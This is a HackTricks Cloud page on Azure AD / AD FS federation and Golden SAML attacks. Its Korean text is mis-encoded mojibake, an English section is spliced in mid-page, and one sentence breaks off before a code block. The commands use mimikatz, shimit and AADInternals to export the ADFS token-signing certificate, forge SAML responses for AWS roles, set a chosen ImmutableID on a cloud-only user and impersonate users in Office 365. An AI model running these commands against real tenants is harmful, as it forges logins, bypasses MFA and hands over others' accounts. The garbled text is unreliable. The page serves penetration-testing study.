# ì—°í•©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ ì°¸ì¡°:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**ì—°í•©**ì€ **ì‹ ë¢°**ë¥¼ í™•ë¦½í•œ **ë„ë©”ì¸**ì˜ ëª¨ìŒì…ë‹ˆë‹¤. ì‹ ë¢° ìˆ˜ì¤€ì€ ë‹¤ì–‘í•  ìˆ˜ ìˆì§€ë§Œ ì¼ë°˜ì ìœ¼ë¡œ **ì¸ì¦**ì„ í¬í•¨í•˜ê³  ê±°ì˜ í•­ìƒ **ì¸ê°€**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ì—°í•©ì€ **ê³µìœ  ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ê³µìœ  ì•¡ì„¸ìŠ¤**ë¥¼ ìœ„í•´ **ì‹ ë¢°**ë¥¼ í™•ë¦½í•œ **ì—¬ëŸ¬ ì¡°ì§**ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½ì„ Azure ADì™€ **ì—°í•©**í•˜ì—¬ ì¸ì¦ ë° ì¸ê°€ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¡œê·¸ì¸ ë°©ë²•ì€ ëª¨ë“  ì‚¬ìš©ì **ì¸ì¦ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ë°œìƒ**í•¨ì„ ë³´ì¥í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ ê´€ë¦¬ìê°€ ë” ì—„ê²©í•œ ì•¡ì„¸ìŠ¤ ì œì–´ ìˆ˜ì¤€ì„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **AD FS** ë° PingFederateì™€ì˜ ì—°í•©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ ì—°í•©ì—ì„œëŠ” ëª¨ë“  **ì¸ì¦**ì´ **ì˜¨í”„ë ˆë¯¸ìŠ¤** í™˜ê²½ì—ì„œ ë°œìƒí•˜ë©° ì‚¬ìš©ìëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ëª¨ë“  í™˜ê²½ì—ì„œ SSOë¥¼ ê²½í—˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ **í´ë¼ìš°ë“œ** ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë³´ì•ˆ ì£¼ì¥ í‘œì‹œ ì–¸ì–´ (SAML)**ì€ ê³µê¸‰ì ê°„ì— ì¸ì¦ ë° ì¸ê°€ì— ëŒ€í•œ ëª¨ë“  ì •ë³´ë¥¼ **êµí™˜**í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ì—°í•© ì„¤ì •ì—ëŠ” ì„¸ ê°€ì§€ ì£¼ì²´ê°€ ìˆìŠµë‹ˆë‹¤:

* ì‚¬ìš©ì ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸
* Identity Provider (IdP)
* Service Provider (SP)

(https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-appsì—ì„œ ì´ë¯¸ì§€ ê°€ì ¸ì˜´)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. ì²˜ìŒì—ëŠ” ì‚¬ìš©ìê°€ ì‘ìš© í”„ë¡œê·¸ë¨ (AWS ì½˜ì†” ë˜ëŠ” vSphere ì›¹ í´ë¼ì´ì–¸íŠ¸ì™€ ê°™ì€ Service Provider ë˜ëŠ” SP)ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤. êµ¬ì²´ì ì¸ êµ¬í˜„ì— ë”°ë¼ì´ ë‹¨ê³„ëŠ” ìš°íšŒë˜ì–´ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì§ì ‘ IdP (Identity Provider)ë¡œ ì´ë™ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. ê·¸ëŸ° ë‹¤ìŒ SPëŠ” ì‚¬ìš©ì ì¸ì¦ì„ ìœ„í•´ ì ì ˆí•œ IdP (ì˜ˆ: AD FS, Okta)ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ SPëŠ” SAML (ë³´ì•ˆ ì£¼ì¥ í‘œì‹œ ì–¸ì–´) AuthnRequestë¥¼ ì‘ì„±í•˜ê³  í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ íƒí•œ IdPë¡œ ë¦¬ë””ë ‰ì…˜í•©ë‹ˆë‹¤.
3. IdPê°€ ì¸ì¦ì„ ìˆ˜í–‰í•˜ì—¬ ì‚¬ìš©ìë¥¼ ì¸ì¦í•©ë‹ˆë‹¤. ì¸ì¦ í›„ IdPëŠ” SAMLResponseë¥¼ ì‘ì„±í•˜ê³  ì‚¬ìš©ìë¥¼ í†µí•´ SPë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ SPëŠ” SAMLResponseë¥¼ í‰ê°€í•©ë‹ˆë‹¤. IdPì™€ì˜ ì‹ ë¢° ê´€ê³„ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì„±ê³µì ì¸ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ì˜ë¯¸í•˜ë©´ ì‚¬ìš©ìì—ê²Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ì´ë¡œì¨ ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ê°€ ì™„ë£Œë˜ì–´ ì‚¬ìš©ìê°€ ì„œë¹„ìŠ¤ë¥¼ í™œìš©í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

**SAML ì¸ì¦ ë° ì¼ë°˜ì ì¸ ê³µê²©ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒìœ¼ë¡œ ì´ë™í•˜ì„¸ìš”:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## í”¼ë²—

* AD FSëŠ” í´ë ˆì„ ê¸°ë°˜ ì‹ ì› ëª¨ë¸ì…ë‹ˆë‹¤.
* "..í´ë ˆì„ì€ ì£¼ë¡œ ì¸í„°ë„· ì–´ë””ì—ì„œë“  í´ë ˆì„ ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ì¸ê°€í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì‚¬ìš©ìì— ëŒ€í•œ ì„ ì–¸ë¬¸(ì˜ˆ: ì´ë¦„, ì‹ ì›, ê·¸ë£¹)ì…ë‹ˆë‹¤."
* ì‚¬ìš©ìì— ëŒ€í•œ í´ë ˆì„ì€ SAML í† í° ë‚´ì— ì‘ì„±ë˜ê³  IdPì— ì˜í•´ ê¸°ë°€ì„±ì„ ì œê³µí•˜ê¸° ìœ„í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì‚¬ìš©ìëŠ” ImmutableIDì— ì˜í•´ ì‹ë³„ë©ë‹ˆë‹¤. ì´ëŠ” ì „ì—­ì ìœ¼ë¡œ ê³ ìœ í•˜ë©° Azure ADì— ì €ì¥ë©ë‹ˆë‹¤.
* ImmutableIDëŠ” ì‚¬ìš©ìì˜ GUIDì—ì„œ íŒŒìƒë  ìˆ˜ ìˆìœ¼ë©° ì‚¬ìš©ìì˜ Azure ADì— ëŒ€í•œ ì¼ê´€ì„± Guidë¡œì„œ ì˜¨í”„ë ˆë¯¸ìŠ¤ì— ì €ì¥ë©ë‹ˆë‹¤.
* ìì„¸í•œ ë‚´ìš©ì€ [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Golden SAML ê³µê²©:**

* ADFSì—ì„œ SAML ì‘ë‹µì€ í† í° ì„œëª… ì¸ì¦ì„œì— ì˜í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì¸ì¦ì„œê°€ ì¹¨í•´ë˜ë©´ Azure ADì— ë™ê¸°í™”ëœ **ëª¨ë“  ì‚¬ìš©ìë¡œ ì¸ì¦**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!
* PTA ë‚¨ìš©ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì‚¬ìš©ìì˜ ì•”í˜¸ ë³€ê²½ì´ë‚˜ MFAëŠ” ì–´ë–¤ ì˜í–¥ë„ ë¯¸ì¹˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ ìš°ë¦¬ëŠ” ì¸ì¦ ì‘ë‹µì„ ìœ„ì¡°í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
* ì¸ì¦ì„œëŠ” DA ê¶Œí•œì„ ê°€ì§„ AD FS ì„œë²„ì—ì„œ ì¶”ì¶œí•œ ë‹¤ìŒ ì¸í„°ë„·ì— ì—°ê²°ëœ ì„ì˜ì˜ ê¸°ê¸°ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ë‚´ìš©ì€ [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Golden SAML

**Identity Provider (IdP)**ê°€ ì‚¬ìš©ì ë¡œê·¸ì¸ì„ ìŠ¹ì¸í•˜ê¸° ìœ„í•´ **SAMLResponse**ë¥¼ ìƒì„±í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ëŠ” ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤. Id
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ëª¨ë“  ì •ë³´ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©´ [**shimit**](https://github.com/cyberark/shimit)ì„ ì‚¬ìš©í•˜ì—¬ í”¼í•´ìë¡œ ìœ„ì¥í•  ë•Œ ìœ íš¨í•œ SAMLResponseë¥¼ ìŠì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
# Federation

## ImmutableID

Azure AD Connect uses the `ImmutableID` attribute to synchronize on-premises Active Directory (AD) users with cloud-only users in Azure AD. This attribute is used to establish a link between the on-premises user and the cloud-only user.

It is important to note that the `ImmutableID` attribute is not meant to be modified by users or administrators. However, as a hacker, you can exploit this attribute to impersonate cloud-only users.

By creating a new `ImmutableID` for a cloud-only user, you can establish a connection between the on-premises user and the cloud-only user. This allows you to impersonate the cloud-only user and gain unauthorized access to their resources.

To create a new `ImmutableID`, you can use various methods such as modifying the attribute directly in Azure AD or using PowerShell scripts. Once the new `ImmutableID` is set, you can use it to authenticate as the cloud-only user and perform lateral movement within the Azure AD environment.

It is important to note that this technique should only be used for ethical hacking purposes and with proper authorization. Unauthorized use of this technique can lead to legal consequences.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
